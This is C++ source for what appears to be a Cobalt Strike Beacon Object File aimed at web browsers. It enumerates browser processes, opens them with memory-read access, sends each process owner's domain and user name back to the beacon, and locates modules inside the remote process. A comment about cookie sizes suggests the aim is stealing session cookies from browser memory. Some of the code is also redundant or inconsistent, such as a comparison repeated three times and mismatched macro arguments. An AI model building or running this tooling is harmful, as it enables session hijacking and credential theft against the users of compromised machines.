#include <WinBase.h>
#include <Shlwapi.h>
#include <TlHelp32.h>
#define _AMD64_

#define MAX_NAME 256 //Maximum name length for GetTokenUser. Don't know what the MS specification actually is

BOOL GetProcessName(HANDLE hProcess, LPCWSTR& targetBrowser) {

    wchar_t processPath[MAX_PATH];
    DWORD size = sizeof(processPath) / sizeof(processPath[0]);

    // Query the full process image name
    if (!QueryFullProcessImageNameW(hProcess, 0, processPath, &size)) {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("QueryFullProcessImageName failed to get target process name"));
        return FALSE;
    }

    const wchar_t* executableName = PathFindFileNameW(processPath);
    if (wcscmp(executableName, targetBrowser) == 0)
        return TRUE;
    if (wcscmp(executableName, targetBrowser) == 0)
        return TRUE;
    if (wcscmp(executableName, targetBrowser) == 0)
        return TRUE;

    return FALSE;
}

BOOL GetProcessHandle(DWORD pid, HANDLE* hProcess) {
    HANDLE hHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hHandle == NULL || hHandle == INVALID_HANDLE_VALUE)
    {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("OpenProcess failed"));
        return FALSE;
    }
    *hProcess = hHandle;
    return TRUE;
}

BOOL IsWow64(HANDLE hProcess) {
    BOOL isBrowserWow64 = FALSE;
    if (!IsWow64Process(hProcess, &isBrowserWow64)) {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("IsWow64Process failed for browser process"));
        CloseHandle(hProcess);
        return TRUE;
    }
    if (isBrowserWow64) {
        CloseHandle(hProcess);
        return TRUE;
    }

    return FALSE;
}

BOOL GetTokenUser(IN HANDLE hProcess, formatp* buffer) {

    HANDLE hToken = NULL;
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken))
    {
        DEBUG_PRINT_ERROR_MESSAGE(L"GetTokenUser OpenProcessToken failed!");
        return FALSE;
    }

    PTOKEN_USER hTokenUser = { 0 };
    DWORD dwSize = 0;

    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize)) {
        DWORD dwError = GetLastError();
        if (dwError != ERROR_INSUFFICIENT_BUFFER) {
            DEBUG_PRINT_ERROR_MESSAGE(L"GetTokenUser GetTokenInformation querying buffer size failed!");
            return FALSE;
        }
    }

    hTokenUser = (PTOKEN_USER)malloc(dwSize);

    if (!GetTokenInformation(hToken, TokenUser, hTokenUser, dwSize, &dwSize)) {
        DEBUG_PRINT_ERROR_MESSAGE(L"GetTokenUser GetTokenInformation failed!");
        free(hTokenUser);
        return FALSE;
    }

    if (hTokenUser == NULL) {
        free(hTokenUser);
        return FALSE;
    }

    wchar_t* UserName = (wchar_t*)malloc(sizeof(wchar_t) * MAX_NAME);
    UserName[0] = L'\0';
    wchar_t* DomainName = (wchar_t*)malloc(sizeof(wchar_t) * MAX_NAME);
    DomainName[0] = L'\0';

    DWORD dwMaxUserName = MAX_NAME;
    DWORD dwMaxDomainName = MAX_NAME;
    SID_NAME_USE SidUser = SidTypeUser;
    if (!LookupAccountSidW(NULL, hTokenUser->User.Sid, UserName, &dwMaxUserName, DomainName, &dwMaxDomainName, &SidUser)) {
        DEBUG_PRINT_ERROR_MESSAGE(L"GetTokenUser LookupAccountSidW failed!");
        free(hTokenUser);
        return FALSE;
    }

    BeaconFormatPrintf(buffer, "%ls", DomainName);
    BeaconFormatPrintf(buffer, "\\");
    BeaconFormatPrintf(buffer, "%ls", UserName);

    free(hTokenUser);
    free(UserName);
    free(DomainName);
    return TRUE;
}

void FindAllSuitableProcesses(LPCWSTR processName)
{
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        DEBUG_PRINT_ERROR_MESSAGE(CALLBACK_ERROR, "CreateToolhelp32Snapshot failed", GetLastError());
        return;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hProcessSnap, &pe32))
    {
        DEBUG_PRINT_ERROR_MESSAGE(CALLBACK_ERROR, "Process32First failed", GetLastError());
        CloseHandle(hProcessSnap);
        return;
    }

    formatp buffer;
    int bufsize = MAX_NAME * 3;
    BeaconFormatAlloc(&buffer, bufsize);

    do
    {
        if (wcscmp(pe32.szExeFile, processName) == 0)
        {
            HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ParentProcessID);

            if (!GetProcessName(hParent, processName))
            {
                HANDLE hHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);

                BeaconFormatPrintf(&buffer, "Found browser process: %d\n", pe32.th32ProcessID);
                BeaconFormatPrintf(&buffer, "    Process owner: ");

                GetTokenUser(hHandle, &buffer);
                BeaconFormatPrintf(&buffer, "\n\n");

                BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(&buffer, &bufsize), bufsize);
                BeaconFormatReset(&buffer);

                CloseHandle(hHandle);
            }
            CloseHandle(hParent);
        }

    } while (Process32NextW(hProcessSnap, &pe32));

    BeaconFormatFree(&buffer);
    CloseHandle(hProcessSnap);
}

BOOL FindCorrectProcessPID(LPCWSTR processName, DWORD* pid, HANDLE* hProcess)
{
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        DEBUG_PRINT_ERROR_MESSAGE("CreateToolhelp32Snapshot failed");
        return FALSE;
    }

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hProcessSnap, &pe32))
    {
        DEBUG_PRINT_ERROR_MESSAGE("Process32First failed");
        CloseHandle(hProcessSnap);
        return(FALSE);
    }

    do
    {
        if (wcscmp(pe32.szExeFile, processName) == 0)
        {
            HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ParentProcessID);

            if (!GetProcessName(hParent, processName))
            {
                CloseHandle(hParent);

                HANDLE hHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);

                formatp buffer;
                int bufsize = MAX_NAME * 3;
                BeaconFormatAlloc(&buffer, bufsize); // RFC 6265 specifies: "At least 4096 bytes per cookie"

                BeaconFormatPrintf(&buffer, "Found browser process: %d\n", pe32.th32ProcessID);
                BeaconFormatPrintf(&buffer, "    Process owner: ");

                GetTokenUser(hHandle, &buffer);
                BeaconFormatPrintf(&buffer, "\n\n");

                BeaconOutput(CALLBACK_OUTPUT, BeaconFormatToString(&buffer, &bufsize), bufsize);
                BeaconFormatFree(&buffer);

                *pid = pe32.th32ProcessID;
                *hProcess = hHandle;
                return TRUE;
            }
            CloseHandle(hParent);
        }

    } while (Process32NextW(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return FALSE;
}
BOOL GetRemoteModuleBaseAddress(HANDLE hProcess, const wchar_t* moduleName, uintptr_t& baseAddress, DWORD* moduleSize) {

    DWORD szModules = sizeof(HMODULE) * 1024; //Should be enough ;)
    HMODULE* hModules = (HMODULE*)malloc(szModules);
    DWORD cbNeeded;

    if (hModules == 0 || !EnumProcessModulesEx(hProcess, hModules, szModules, &cbNeeded, LIST_MODULES_ALL)) {
        DEBUG_PRINT_ERROR_MESSAGE(TEXT("EnumProcessModulesEx failed"));
        free(hModules);
        return FALSE;
    }

    for (int i = 0; i < (cbNeeded / sizeof(HMODULE)); ++i) {
        wchar_t szModuleName[MAX_PATH];
        if (GetModuleBaseNameW(hProcess, hModules[i], szModuleName, sizeof(szModuleName) / sizeof(wchar_t)) == 0) {
            DEBUG_PRINT_ERROR_MESSAGE(TEXT("GetModuleBaseName failed"));
            continue;
        }
        if (_wcsicmp(szModuleName, moduleName) == 0) {
            MODULEINFO moduleInfo;
            if (!GetModuleInformation(hProcess, hModules[i], &moduleInfo, sizeof(moduleInfo))) {
                DEBUG_PRINT_ERROR_MESSAGE(TEXT("GetModuleInformation failed"));
                free(hModules);
                return FALSE;
            }
            baseAddress = reinterpret_cast<uintptr_t>(moduleInfo.lpBaseOfDll);
            *moduleSize = moduleInfo.SizeOfImage;
            free(hModules);
            return TRUE;
        }
    }
    free(hModules);
    return FALSE;
}